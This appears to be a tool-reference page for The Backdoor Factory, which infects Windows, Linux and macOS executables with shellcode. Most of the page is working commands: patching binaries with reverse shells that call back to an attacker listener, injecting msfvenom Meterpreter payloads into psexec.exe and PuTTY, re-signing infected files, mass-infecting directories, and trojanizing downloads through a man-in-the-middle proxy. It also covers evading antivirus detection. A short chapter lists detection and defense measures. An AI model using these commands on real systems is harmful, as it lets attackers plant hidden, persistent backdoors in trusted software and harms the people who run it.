---
title: "The Backdoor Factory"
tool_name: "backdoor-factory"
category: "Shellcode & Payload"
phase: "02 - Resource Development"
difficulty: "Intermediate"
platform: "Linux (targets Windows, Linux, macOS)"
language: "Python"
license: "BSD-3-Clause"
repository: "https://github.com/secretsquirrel/the-backdoor-factory"
kali_package: "backdoor-factory"
mitre_attack:
  tactic: "resource-development"
  technique_id: "TA0042"
  technique_name: "Resource Development"
  sub_technique: "shellcode_payload"
tags:
  - "pe-patching"
  - "elf-patching"
  - "code-cave"
  - "binary-infection"
date_created: "2013-09-26"
last_updated: "2016-01-11"
author: "Josh Pitts (secretsquirrel)"
---

# The Backdoor Factory — Comprehensive Documentation

---

## Chapter 1: Introduction & Overview

The Backdoor Factory (BDF) patches executable binaries — PE, ELF, and Mach-O — with user-supplied shellcode while preserving the original program's functionality. Unlike simpler infection tools, BDF analyzes the target binary's structure, identifies code caves (unused regions within code sections), and injects shellcode into these gaps.

### Supported Formats

| Format | Architecture | Status |
|--------|-------------|--------|
| Windows PE | x86, x64 | Fully supported |
| Linux ELF | x86, x64, ARM x32 LE | Fully supported |
| macOS Mach-O | x86, x64 | Fully supported |
| PE UPX | x86, x64 | Supported |
| OpenBSD ELF | x32 | Experimental |
| FAT binaries | x86, x64 | Supported |

### Code Cave Injection

BDF's primary technique is code cave injection. The tool:

1. Scans the binary for sequences of null bytes (code caves) within existing sections
2. Places shellcode in a selected cave
3. Patches the entry point to redirect execution to the cave
4. Creates a stub that restores original registers and resumes normal execution

This approach avoids the telltale signs of binary infection:
- No new sections with RWX permissions
- Original section layout preserved
- Certificate table pointer is cleared (unsigning the binary)
- Normal execution flow maintained

### BDFProxy Integration

BDF was designed to work with BDFProxy for man-in-the-middle binary infection — automatically patching executables downloaded through a proxy.

---

## Chapter 2: Installation & Setup

### Kali Linux

```bash
sudo apt update && sudo apt install backdoor-factory
```

**Explanation:** Installs BDF from the Kali repository.

### From Source

```bash
git clone https://github.com/secretsquirrel/the-backdoor-factory.git
cd the-backdoor-factory
./install.sh
```

**Explanation:** Clones the repository and runs the installation script, which installs Capstone and pefile dependencies.

### Docker

```bash
docker pull secretsquirrel/the-backdoor-factory
docker run -it secretsquirrel/the-backdoor-factory bash
```

**Explanation:** Pulls and runs the official Docker container with all dependencies pre-installed.

### Dependencies

- **Capstone**: Disassembly engine (`pip install capstone`)
- **pefile**: PE file parser
- **osslsigncode**: PE code signing (included in repo)

### Verify Installation

```bash
./backdoor.py -h
```

---

## Chapter 3: Basic Usage

### Listing Available Shellcode

```bash
./backdoor.py -s list
```

**Explanation:** Displays all available shellcode payloads built into BDF.

### Patching a PE with Existing Code Cave

```bash
./backdoor.py -f target.exe \
  -H 192.168.1.100 \
  -P 8080 \
  -s reverse_shell_tcp
```

**Explanation:** Patches target.exe with a reverse TCP shellcode, using an existing code cave for injection. BDF automatically selects the first suitable cave.

### Patching with Appended Code Section

```bash
./backdoor.py -f target.exe \
  -H 192.168.1.100 \
  -P 8080 \
  -s reverse_shell_tcp \
  -a
```

**Explanation:** Creates a new code section in the PE file and injects shellcode there — useful when no suitable code caves exist.

### Using User-Supplied Shellcode

```bash
# Generate shellcode with MSFvenom
msfvenom -p windows/exec CMD="calc.exe" R > calc.bin

# Inject into target
./backdoor.py -f target.exe \
  -s user_supplied_shellcode \
  -U calc.bin
```

**Explanation:** BDF accepts any raw shellcode file, enabling integration with MSFvenom or custom shellcode.

### Complete Flags Reference

| Flag | Description |
|------|-------------|
| **-f** | Target PE/ELF/Mach-O file |
| **-d** | Directory of files to patch |
| **-H** | LHOST for reverse shells |
| **-P** | LPORT for reverse shells |
| **-s** | Shellcode type (reverse_shell_tcp, iat_reverse_tcp_inline, user_supplied_shellcode, etc.) |
| **-U** | Path to user-supplied shellcode file |
| **-a** | Append new code section (no code cave selection) |
| **-A** | IAT-based directory cave assignment |
| **-C** | Enable PE code signing (requires certs in certs/ directory) |
| **-i** | Injector module (Windows only — hunts and backdoors targets on disk) |
| **-m** | Patch method: `automatic`, `onionduke`, `replace` |
| **-u** | Suffix for backup files (default: .old) |
| **-X** | XP compatibility mode (for IAT-based payloads) |
| **-p** | Preprocessor module |
| **-b** | Binary to supply for replace method or onionduke |
| **-S** | Scan target without patching |

---

## Chapter 4: Intermediate Usage

### Patching a Directory of Executables

```bash
./backdoor.py -d /path/to/exes/ \
  -H 192.168.1.100 \
  -P 8080 \
  -s reverse_shell_tcp \
  -a
```

**Explanation:** Iterates through all executables in a directory, patching each with the specified shellcode using appended sections.

### IAT-Based Payloads

```bash
./backdoor.py -f target.exe \
  -H 192.168.1.100 \
  -P 8080 \
  -s iat_reverse_tcp_inline \
  -m automatic
```

**Explanation:** IAT (Import Address Table) payloads use existing Windows API imports for execution, bypassing EMET protections. The `-m automatic` flag enables automatic cave selection.

### Injector Module (Windows Only)

```bash
./backdoor.py -i \
  -H 192.168.1.100 \
  -P 8080 \
  -s reverse_shell_tcp \
  -a \
  -u .moocowwow
```

**Explanation:** The injector module scans for target executables on a live Windows system, kills running processes, patches the binary on disk, and attempts to restart it.

### PE Code Signing

```bash
# Prepare certificates
echo -n "password" > certs/passFile.txt
cp signingCert.cer certs/signingCert.cer
cp signingPrivateKey.pem certs/signingPrivateKey.pem

# Sign during infection
./backdoor.py -f target.exe \
  -s iat_reverse_tcp_inline \
  -H 192.168.1.100 \
  -P 8080 \
  -m automatic \
  -C
```

**Explanation:** BDF can re-sign infected binaries using a code signing certificate, maintaining the appearance of a legitimately signed executable.

### ELF Binary Patching

```bash
./backdoor.py -f /usr/bin/legitimate_tool \
  -H 192.168.1.100 \
  -P 8080 \
  -s reverse_shell_tcp \
  -a
```

**Explanation:** BDF extends the ELF text segment by 1000 bytes and injects shellcode into the new space. The patched tool runs normally while providing a reverse shell.

---

## Chapter 5: Advanced Usage

### OnionDuke Technique

```bash
./backdoor.py -f original.exe \
  -m onionduke \
  -b pentest.dll
```

**Explanation:** The OnionDuke technique, inspired by nation-state malware, replaces the resource section of the target with the attacker's binary while preserving the original's appearance.

### Preprocessor Module

BDF's preprocessor modifies the binary before injection:

```bash
./backdoor.py -f target.exe \
  -H 192.168.1.100 \
  -P 8080 \
  -s reverse_shell_tcp \
  -p preprocessor/sample_preprocessor.py
```

**Explanation:** Preprocessors allow arbitrary modifications to the target binary prior to shellcode injection — stripping debug info, modifying imports, or applying additional transformations.

### Replace Method

```bash
./backdoor.py -f weee.exe \
  -m replace \
  -b supplied_binary.exe
```

**Explanation:** The replace method does a straight PE copy — replacing the original binary entirely with the supplied executable, useful for BDFProxy MITM attacks.

### Custom Shellcode Pipeline

```bash
# Generate custom shellcode
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=8080 \
  -f raw \
  -b '\x00' \
  -o custom.bin

# Inject into a trusted binary
./backdoor.py -f /usr/share/windows-resources/binaries/psexec.exe \
  -s user_supplied_shellcode \
  -U custom.bin
```

**Explanation:** Combining MSFvenom's payload variety with BDF's injection capabilities creates a customized infection pipeline.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Red Team — Binary Infection for Persistence

During a red team engagement, the objective was persistent access to a Windows domain. Standard persistence mechanisms (scheduled tasks, registry keys) were monitored by the SOC.

```bash
# Infect a commonly used admin tool
./backdoor.py -f putty.exe \
  -H 192.168.1.100 \
  -P 443 \
  -s iat_reverse_tcp_inline \
  -m automatic \
  -a \
  -C

# Deploy the infected binary to a network share
# When admin runs putty.exe, a reverse shell connects back
```

**Explanation:** Infected PuTTY executes normally — the SSH client functions as expected — while silently establishing a reverse TCP connection on port 443 (HTTPS port), blending with legitimate encrypted traffic.

### Scenario 2: Proxy-Based Binary Trojanning

Using BDFProxy for man-in-the-middle infection of executables downloaded through a compromised network:

```bash
# Configure BDFProxy to intercept .exe downloads
# All downloaded executables are automatically infected
# with the specified shellcode before delivery to the target
```

**Explanation:** BDFProxy intercepts HTTP traffic, identifies executable downloads, and patches them on-the-fly using BDF. Every executable downloaded through the proxy is infected without modifying the web server.

### Scenario 3: CTF — ELF Binary Patching

A CTF challenge required modifying a Linux binary to include a backdoor without breaking its functionality:

```bash
# Patch the challenge binary
./backdoor.py -f ./challenge \
  -H 10.10.14.5 \
  -P 4444 \
  -s reverse_shell_tcp \
  -a

# The patched binary runs normally
# When executed on the target, it provides a reverse shell
./challenge
```

**Explanation:** BDF's ELF patching extends the text section and injects shellcode, creating a trojanized binary that passes basic functionality tests while containing a hidden backdoor.

---

## Chapter 7: Detection & Defense

### Binary Integrity Monitoring

- **File hashing**: Monitor hash changes on known-good executables
- **Code signing validation**: Verify digital signatures before execution
- **PE section analysis**: Detect appended sections or unusual section sizes
- **Certificate table validation**: BDF clears the certificate table — monitor for unsigned binaries that were previously signed

### Memory Analysis

- Scan for execution from data sections (code caves in `.data` or `.rsrc`)
- Detect entry point redirection to non-standard locations
- Monitor for IAT-based API resolution patterns

### Network Indicators

- Connections from normally non-networking applications
- Outbound connections on unusual ports from trusted executables
- Beacons from applications that don't normally communicate externally

### Defensive Recommendations

1. **Implement file integrity monitoring** (FIM) on critical executables
2. **Restrict network access** from applications that don't require it
3. **Use application whitelisting** to prevent execution of modified binaries
4. **Monitor PE certificate tables** for unexpected changes
5. **Deploy behavioral analysis** to detect execution anomalies

---

## Chapter 8: Troubleshooting

### "Binary not supported" Error

**Cause:** The target binary has protections that prevent injection — NSIS installers, bound imports, or unusual PE structure.

```bash
# Check if binary needs to run with elevated privileges
./backdoor.py -f target.exe -S

# Try a different target binary
```

**Explanation:** Not all binaries are compatible. BDF checks for bound imports, section alignment, and other structural requirements before attempting injection.

### Shellcode Too Large for Any Cave

**Cause:** The available code caves are smaller than the shellcode.

```bash
# Use append mode to create a new section
./backdoor.py -f target.exe \
  -H 192.168.1.100 -P 8080 \
  -s reverse_shell_tcp -a
```

**Explanation:** Append mode (-a) creates a new section, bypassing code cave size limitations.

### Injection Fails on ELF

**Cause:** The ELF binary doesn't have sufficient padding in the text segment.

```bash
# Try a different binary with more code space
# Or use user-supplied minimal shellcode
```

**Explanation:** ELF injection extends the text segment by 1000 bytes. Some binaries may not support this modification due to memory alignment requirements.

### Backdoored Binary Crashes

**Cause:** The code cave selection corrupted critical execution paths.

```bash
# Use jump mode for safer cave jumping
./backdoor.py -f target.exe \
  -H 192.168.1.100 -P 8080 \
  -s reverse_shell_tcp

# Select "j" (jump) when choosing cave method
```

**Explanation:** Jump mode creates short jumps between multiple caves, distributing shellcode across multiple locations and reducing the risk of corrupting single execution paths.

---

## Resources

### Official Documentation

- [BDF GitHub Wiki](https://github.com/secretsquirrel/the-backdoor-factory/wiki) — Comprehensive documentation
- [Black Hat Arsenal 2015](https://www.blackhat.com/us-15/arsenal.html) — Conference presentation
- [DerbyCon 2014 Video](http://www.youtube.com/watch?v=LjUN9MACaTs) — Technical overview

### Related Tools

- [BDFProxy](https://github.com/secretsquirrel/BDFProxy) — MITM binary infection proxy
- [Shellter](https://www.shellterproject.com/) — Alternative PE infector
- [Metasploit Framework](https://github.com/rapid7/metasploit-framework) — Payload generation

### Research

- [PE Code Cave Injection](https://resources.infosecinstitute.com/topic/code-caves/) — Understanding code cave techniques
- [OnionDuke Analysis](https://www.blackhat.com/docs/us-15/materials/us-15-Pitts-Repurposing-OnionDuke-A-Single-Case-Study-Around-Reusing-Nation-State-Malware-wp.pdf) — The technique behind BDF's OnionDuke mode
- [ELF Patching Techniques](http://vxheaven.org/lib/vsc01.html) — Silvio Cesare's 1998 paper on ELF infection
- [ShmooCon 2015 Paper](https://www.dropbox.com/s/te7e35c8xcnyfzb/JoshPitts-UserlandPersistenceOnMacOSX.pdf) — Userland persistence on macOS

### BDF vs Shellter Comparison

| Feature | Backdoor Factory | Shellter |
|---------|-----------------|----------|
| Target formats | PE, ELF, Mach-O | PE only (32-bit) |
| Architecture | x86, x64, ARM | x86 only |
| Code cave injection | Yes | Yes |
| IAT patching | Yes | No |
| Code signing | Yes (via osslsigncode) | No |
| OnionDuke mode | Yes | No |
| ELF support | Yes | No |
| Active development | Sponsors-only (new version) | Active |
| Batch mode | Yes (directory patching) | No |

### Code Cave Selection Guide

When BDF presents multiple code caves, consider these factors:

- **Cave size**: Larger caves accommodate bigger shellcode but may be in less common execution paths
- **Section location**: `.text` section caves execute faster; `.data` caves may have different permissions
- **Distance from entry point**: Closer caves minimize jump distance, reducing detection by some AV heuristics
- **Surrounding instructions**: Caves surrounded by padding (null bytes) are safer than those between active instructions

### Preprocessor Module Examples

BDF's preprocessor module system allows arbitrary binary modifications:

```python
# Example preprocessor: Strip debug information
# Save as preprocessor/strip_debug.py

def pre_process(pe_file):
    """Remove debug directory entries"""
    if hasattr(pe_file, 'DIRECTORY_ENTRY_DEBUG'):
        pe_file.OPTIONAL_HEADER.DATA_DIRECTORY[6].VirtualAddress = 0
        pe_file.OPTIONAL_HEADER.DATA_DIRECTORY[6].Size = 0
    return pe_file
```

**Explanation:** Preprocessors run before shellcode injection, enabling binary hardening, signature evasion, or structural modifications.

---

*Last updated: July 2026*
